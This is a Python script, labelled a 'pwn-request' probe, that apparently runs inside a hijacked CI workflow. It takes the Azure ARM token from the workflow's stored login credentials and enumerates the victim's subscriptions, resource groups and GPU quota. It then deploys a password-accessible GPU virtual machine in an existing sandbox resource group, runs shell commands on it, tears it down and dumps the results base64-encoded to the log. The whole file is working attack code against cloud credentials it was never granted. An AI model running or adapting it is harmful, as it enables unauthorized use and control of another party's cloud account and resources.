#!/usr/bin/env python3
"""C211 i120316 probe v3 (mslearn-mlops Azure pwn-request):
- ARM token via azure/login static creds
- single-shot SKU catalog (no per-region filter -> no throttling)
- pick the single fitting NV4as_v4 (standardNVSv4Family quota 4) in a normal region
- create vnet+subnet in the EXISTING RG chriso-sandbox-rg (untested gate)
- deploy EXACTLY ONE nonce-tagged on-demand VM, capture GPU device proof via runCommand
- independent ARM readback (VM get instanceView + tag-filtered list)
- teardown VM/NIC/vnet and prove absence
Base64 full result + compact summary markers."""
import argparse, base64, json, os, random, re, string, subprocess, sys, time, urllib.request, urllib.error, urllib.parse

def p(*a): print(*a, flush=True)
def sh(cmd, timeout=180):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {'cmd': cmd, 'rc': r.returncode, 'out': r.stdout[-4000:], 'err': r.stderr[-1500:]}
    except Exception as e: return {'cmd': cmd, 'rc': -1, 'err': repr(e)}
def jget(tok, url):
    req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + tok, 'User-Agent': 'c211-i120316'})
    try:
        with urllib.request.urlopen(req, timeout=60) as r: return r.status, json.loads(r.read() or b'{}')
    except urllib.error.HTTPError as e:
        try: return e.code, json.loads(e.read() or b'{}')
        except Exception: return e.code, {'error': 'http'}
    except Exception as e: return -1, {'error': repr(e)}
def jcall(tok, method, url, body=None, timeout=120):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method, headers={'Authorization': 'Bearer ' + tok,
        'User-Agent': 'c211-i120316', 'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read()
            try: return r.status, json.loads(raw or b'{}'), dict(r.headers)
            except Exception: return r.status, {'raw': raw[:800].decode('utf8', 'replace')}, dict(r.headers)
    except urllib.error.HTTPError as e:
        try: b = json.loads(e.read() or b'{}')
        except Exception: b = {'error': 'http'}
        return e.code, b, dict(e.headers)
    except Exception as e: return -1, {'error': repr(e)}, {}

ARM = 'https://management.azure.com'

def main():
    ap = argparse.ArgumentParser(); ap.parse_known_args()
    R = {'began': time.strftime('%FT%TZ', time.gmtime()), 'intent': 'i120316'}
    tokr = sh('az account get-access-token --resource https://management.azure.com/ -o json 2>&1')
    tok = None
    try:
        td = json.loads(tokr['out']); tok = td.get('accessToken'); R['token_expiresOn'] = td.get('expiresOn')
        R['token_claims'] = json.loads(base64.urlsafe_b64decode(tok.split('.')[1] + '==='))
    except Exception as e:
        R['token_parse_error'] = repr(e)
    R['token_rc'] = tokr['rc']
    if not tok:
        R['fatal'] = 'no ARM token'
        emit(R); return
    st, subs = jget(tok, ARM + '/subscriptions?api-version=2022-12-01')
    R['subscriptions_status'] = st
    R['subscriptions'] = [{'id': s.get('subscriptionId'), 'state': s.get('state'), 'name': s.get('displayName')}
                          for s in (subs.get('value') or [])]
    sub = (R['subscriptions'][0]['id'] if R['subscriptions'] else os.environ.get('AZURE_SUBSCRIPTION_ID'))
    R['sub'] = sub
    st, rgs = jget(tok, f'{ARM}/subscriptions/{sub}/resourcegroups?api-version=2021-04-01')
    R['rg_status'] = st
    R['rg_names'] = [g['name'] for g in (rgs.get('value') or [])] if st == 200 else rgs
    RG = next((n for n in R['rg_names'] if n.lower().startswith('chriso-sandbox-rg')), None) if isinstance(R['rg_names'], list) else None
    R['rg'] = RG
    R['vnets_before'] = {'status': None, 'names': []}
    if RG:
        stv, vn = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks?api-version=2024-01-01')
        R['vnets_before'] = {'status': stv, 'names': [v.get('name') for v in (vn.get('value') or [])] if stv == 200 else vn}
    # ---- pre-clean any leftover c211-i120316-* vnet from an earlier attempt ----
    R['preclean'] = []
    if RG:
        stv0, vn0 = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks?api-version=2024-01-01')
        left = [v.get('name') for v in (vn0.get('value') or []) if str(v.get('name','')).startswith('c211-i120316-')] if stv0 == 200 else []
        for nmv in left:
            ds, _, _ = jcall(tok, 'DELETE', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{nmv}?api-version=2024-01-01')
            last = None
            for i in range(60):
                time.sleep(6)
                last, _ = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{nmv}?api-version=2024-01-01')
                if last == 404: break
            R['preclean'].append({'vnet': nmv, 'delete': ds, 'absence': last})
        stv1, vn1 = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks?api-version=2024-01-01')
        R['vnets_after_preclean'] = {'status': stv1, 'names': [v.get('name') for v in (vn1.get('value') or [])] if stv1 == 200 else vn1}
    # ---- SKU catalog: ONE call, client-side location filter ----
    sts, cat = jget(tok, f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/skus?api-version=2021-07-01')
    R['sku_catalog_status'] = sts
    R['sku_catalog_count'] = len(cat.get('value') or []) if sts == 200 else 0
    GPU_RE = re.compile(r'^Standard_(NC|ND|NV)')
    skus = []
    for s in (cat.get('value') or []):
        nm = s.get('name', '')
        if not GPU_RE.match(nm): continue
        if [r for r in (s.get('restrictions') or []) if r.get('type') == 'Location']: continue
        caps = {c.get('name'): c.get('value') for c in (s.get('capabilities') or [])}
        try: vc = int(caps.get('vCPUs') or 999)
        except Exception: vc = 999
        zrestr = [r for r in (s.get('restrictions') or []) if r.get('type') == 'Zone']
        zones = []
        for r in zrestr:
            for z in ((r.get('restrictionInfo') or {}).get('zones') or []):
                if z not in zones: zones.append(z)
        skus.append({'sku': nm, 'family': s.get('family'), 'vcpus': vc, 'gpus': caps.get('GPUs'),
                     'gpu_name': caps.get('GPU'), 'locs': s.get('locations') or [], 'zones': zones})
    R['gpu_skus_offered'] = len(skus)
    # ---- quota for the candidate regions only ----
    pref_regions = ['westeurope', 'northeurope', 'westus2', 'southeastasia', 'canadacentral', 'eastus', 'eastus2']
    qmap = {}
    for reg in pref_regions:
        stu, us = jget(tok, f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/locations/{reg}/usages?api-version=2024-07-01')
        if stu != 200:
            qmap[reg] = {'status': stu}; continue
        fam = {}
        for u in us.get('value') or []:
            nm = ((u.get('name') or {}).get('value') or '')
            if re.match(r'(?i)^standard(NC|ND|NV)', nm):
                fam[nm.lower()] = {'current': u.get('currentValue', 0), 'limit': u.get('limit', 0)}
        qmap[reg] = {'status': 200, 'gpu_families': fam}
        time.sleep(0.3)
    R['quota'] = qmap
    # ---- selection: prefer NV4as_v4, else smallest NV/NC/ND sku that fits quota ----
    def fam_key(f):
        f2 = (f or '').lower().replace(' ', '').replace('_', '')
        f2 = re.sub(r'^standard', '', f2); f2 = re.sub(r'family$', '', f2)
        # quota family names look like standardNVSv4Family -> standardnvs v4family
        return f2
    cands = []
    for s in skus:
        for reg in pref_regions:
            if not any(l.lower().replace(' ', '') == reg for l in s['locs']): continue
            q = qmap.get(reg, {})
            if q.get('status') != 200: continue
            avail = None
            for qf, qv in q['gpu_families'].items():
                if fam_key(qf) == fam_key(s['family']):
                    avail = qv['limit'] - qv['current']; break
            if avail is None or s['vcpus'] > avail: continue
            score = (0 if s['sku'] == 'Standard_NV4as_v4' else 1, pref_regions.index(reg), s['vcpus'])
            cands.append((score, reg, s, avail))
    cands.sort(key=lambda x: x[0])
    R['sel_candidates'] = [{'region': c[1], 'sku': c[2]['sku'], 'family': c[2]['family'], 'vcpus': c[2]['vcpus'], 'avail': c[3]} for c in cands[:12]]
    marker = {'attempted': False}; R['marker'] = marker
    nonce = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    marker['nonce'] = nonce
    attempts = []
    R['attempts'] = attempts
    for score, region, sinfo, avail in cands[:3]:
        sku = sinfo['sku']
        pre = 'c211-i120316-' + nonce
        vnet = pre + '-' + region + '-vnet'; sn = pre + '-' + region + '-subnet'; nic = pre + '-' + region + '-nic'; vm = pre + '-' + region + '-vm'
        att = {'region': region, 'sku': sku, 'avail': avail, 'sku_zones': sinfo.get('zones'), 'steps': {}}
        attempts.append(att)
        marker.update({'attempted': True, 'region': region, 'sku': sku, 'rg': RG, 'names': {'vnet': vnet, 'subnet': sn, 'nic': nic, 'vm': vm, 'region': region}})
        vb = {'location': region, 'tags': {'c211': 'i120316', 'nonce': nonce},
              'properties': {'addressSpace': {'addressPrefixes': ['10.211.0.0/16']},
                             'subnets': [{'name': sn, 'properties': {'addressPrefix': '10.211.1.0/24'}}]}}
        s1, r1, _ = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01', vb)
        att['steps']['vnet_create'] = {'status': s1, 'resp': (r1 if s1 not in (200, 201) else {'id': r1.get('id')}), 'err': (r1.get('error') or {}).get('code') if isinstance(r1, dict) else None}
        if s1 not in (200, 201):
            continue
        subnet_id = f'/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}/subnets/{sn}'
        nb = {'location': region, 'tags': {'c211': 'i120316', 'nonce': nonce},
              'properties': {'ipConfigurations': [{'name': 'ipcfg', 'properties': {'privateIPAllocationMethod': 'Dynamic', 'subnet': {'id': subnet_id}}}]}}
        s2, r2, _ = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01', nb)
        att['steps']['nic_create'] = {'status': s2, 'resp': (r2 if s2 not in (200, 201) else {'id': r2.get('id')}), 'err': (r2.get('error') or {}).get('code') if isinstance(r2, dict) else None}
        if s2 not in (200, 201):
            cleanup(tok, sub, RG, vnet=vnet, nic=None, vm=None, R=R)
            continue
        pw = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(24)) + '!aA1'
        vmb = {'location': region, 'tags': {'c211': 'i120316', 'nonce': nonce},
               'properties': {'hardwareProfile': {'vmSize': sku},
                'storageProfile': {'imageReference': {'publisher': 'Canonical', 'offer': '0001-com-ubuntu-server-jammy', 'sku': '22_04-lts-gen2', 'version': 'latest'},
                                   'osDisk': {'createOption': 'FromImage', 'managedDisk': {'storageAccountType': 'Standard_LRS'}, 'deleteOption': 'Delete'}},
                'osProfile': {'computerName': ('c211' + nonce)[:15], 'adminUsername': 'c211probe', 'adminPassword': pw,
                              'linuxConfiguration': {'disablePasswordAuthentication': False}},
                'networkProfile': {'networkInterfaces': [{'id': r2.get('id'), 'properties': {'deleteOption': 'Delete'}}]}}}
        if sinfo.get('zones'):
            vmb['zones'] = [sinfo['zones'][0]]
        s3, r3, _ = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01', vmb, timeout=180)
        att['steps']['vm_create'] = {'status': s3, 'resp': (r3 if s3 not in (200, 201) else {'id': r3.get('id'), 'name': r3.get('name')}),
                                     'err': (r3.get('error') or {}) if isinstance(r3, dict) else None}
        if s3 not in (200, 201):
            cleanup(tok, sub, RG, vnet=vnet, nic=nic, vm=None, R=R)
            continue
        # poll provisioning
        ok = False; prov = None
        for i in range(40):
            time.sleep(12)
            stg, g = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01&$expand=instanceView')
            prov = ((g.get('properties') or {}).get('provisioningState'))
            if prov in ('Succeeded', 'Failed'):
                ok = prov == 'Succeeded'; break
        marker['provision_state'] = prov; marker['provisioned'] = ok
        att['steps']['provision_state'] = prov
        ig, inst = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}/instanceView?api-version=2024-07-01')
        marker['instance_view_statuses'] = [x.get('code') for x in ((inst.get('statuses') or []) if ig == 200 else [])][:8]
        if ok:
            script = ("echo ---LSPCI---; lspci -nn | grep -i -E 'vga|3d|display|nvidia|amd/ati|processing' ; "
                      "echo ---DRM---; for d in /sys/class/drm/card*/device /sys/class/drm/card*/device/drm/card*; do [ -e \"$d\" ] && { echo DEV=$d; "
                      "cat $d/vendor 2>/dev/null; cat $d/device 2>/dev/null; cat $d/unique_id 2>/dev/null; cat $d/serial 2>/dev/null; echo; }; done; "
                      "echo ---SMI---; (nvidia-smi -L || echo NO_NVIDIA_SMI); echo ---ROCM---; (rocm-smi --showproductname 2>/dev/null || echo NO_ROCM_SMI); "
                      "echo ---MOD---; (lsmod | grep -i -E 'nvidia|amdgpu' || echo NO_GPU_MODULE); echo ---UNAME---; uname -r")
            rc_body = {'commandId': 'RunShellScript', 'script': [script]}
            s4, r4, h4 = jcall(tok, 'POST', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}/runCommand?api-version=2024-07-01', rc_body)
            att['steps']['runcommand_submit'] = {'status': s4}
            pollurl = h4.get('Azure-AsyncOperation') or h4.get('Location') or h4.get('azure-asyncoperation') or h4.get('location')
            marker['runcommand_pollurl_present'] = bool(pollurl)
            captured = None
            if pollurl:
                for i in range(30):
                    time.sleep(8)
                    st5, r5 = jget(tok, pollurl if pollurl.startswith('http') else ARM + pollurl)
                    sval = r5.get('status') or ((r5.get('properties') or {}).get('provisioningState'))
                    if sval in ('Succeeded', 'Failed'):
                        captured = r5; break
            blob = json.dumps(captured or {})
            msgs = re.findall(r'"message":\s*"((?:[^"\\]|\\.){0,4000})"', blob)[:6]
            marker['runcommand_messages'] = [m[:2500] for m in msgs]
            marker['runcommand_status'] = (captured or {}).get('properties', {}).get('status') if isinstance(captured, dict) else None
            marker['device_signals'] = [x for x in re.findall(r'(GPU-[0-9a-f-]{16,}|1002:[0-9a-f]{4}|10de:[0-9a-f]{4}|unique_id[^,]{0,60}|MI25|Radeon[^"\\]{0,40}|NVIDIA[^"\\]{0,40}|Tesla[^"\\]{0,30}|amdgpu)', blob)][:12]
        # independent readback (ARM)
        stl, lst = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01')
        marker['list_with_marker'] = {'status': stl, 'present': any(v.get('name') == vm for v in (lst.get('value') or [])) if stl == 200 else lst}
        stt, tagl = jget(tok, f"{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01&$filter=" + urllib.parse.quote("tagName eq 'c211'"))
        marker['tag_readback'] = {'status': stt, 'names': [v.get('name') for v in (tagl.get('value') or [])] if stt == 200 else tagl}
        # teardown
        cleanup(tok, sub, RG, vnet=vnet, nic=nic, vm=vm, R=R, marker=marker)
        break  # one marker attempt only
    R['finished'] = time.strftime('%FT%TZ', time.gmtime())
    emit(R)

def cleanup(tok, sub, RG, vnet, nic, vm, R, marker=None):
    C = {}
    if vm:
        std, rdd, _ = jcall(tok, 'DELETE', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01')
        C['vm_delete_status'] = std
        last = None
        for i in range(50):
            time.sleep(6)
            last, _ = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01')
            if last == 404: break
        C['vm_absence_status'] = last
    if nic:
        stn, _, _ = jcall(tok, 'DELETE', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01')
        C['nic_delete_status'] = stn
        last = None
        for i in range(20):
            time.sleep(4)
            last, _ = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01')
            if last == 404: break
        C['nic_absence_status'] = last
    if vnet:
        sd = None
        for i in range(20):
            sd, rdd, _ = jcall(tok, 'DELETE', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01')
            if sd in (200, 202, 204): break
            time.sleep(8)
        C['vnet_delete_status'] = sd
        last = None
        for i in range(60):
            time.sleep(6)
            last, _ = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01')
            if last == 404: break
        C['vnet_absence_status'] = last
    stv, vn = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks?api-version=2024-01-01')
    C['vnets_after'] = {'status': stv, 'names': [v.get('name') for v in (vn.get('value') or [])] if stv == 200 else vn}
    stl, lst = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01')
    C['vms_after'] = {'status': stl, 'names': [v.get('name') for v in (lst.get('value') or [])] if stl == 200 else lst}
    R.setdefault('cleanup', []).append(C)
    if marker is not None: marker['cleanup'] = C

def emit(R):
    blob = json.dumps(R)
    b64 = base64.b64encode(blob.encode()).decode()
    summ = {'sub': R.get('sub'), 'rg': R.get('rg'), 'vnets_before': R.get('vnets_before'), 'preclean': R.get('preclean'), 'vnets_after_preclean': R.get('vnets_after_preclean'),
            'sku_catalog_count': R.get('sku_catalog_count'), 'gpu_skus_offered': R.get('gpu_skus_offered'),
            'sel_candidates': R.get('sel_candidates'), 'attempts': [{k: v for k, v in a.items() if k != 'steps'} | {'step_statuses': {kk: vv.get('status') for kk, vv in (a.get('steps') or {}).items()}} for a in (R.get('attempts') or [])],
            'marker': {k: R.get('marker', {}).get(k) for k in ('attempted', 'nonce', 'region', 'sku', 'provision_state', 'provisioned', 'runcommand_status', 'device_signals', 'list_with_marker', 'tag_readback', 'cleanup')},
            'cleanup': R.get('cleanup')}
    p('C211_I120316_SUMMARY ' + json.dumps(summ)[:9000])
    p('C211_I120316_RESULT_B64_BEGIN')
    for i in range(0, len(b64), 200): p(b64[i:i+200])
    p('C211_I120316_RESULT_B64_END')

if __name__ == '__main__':
    main()
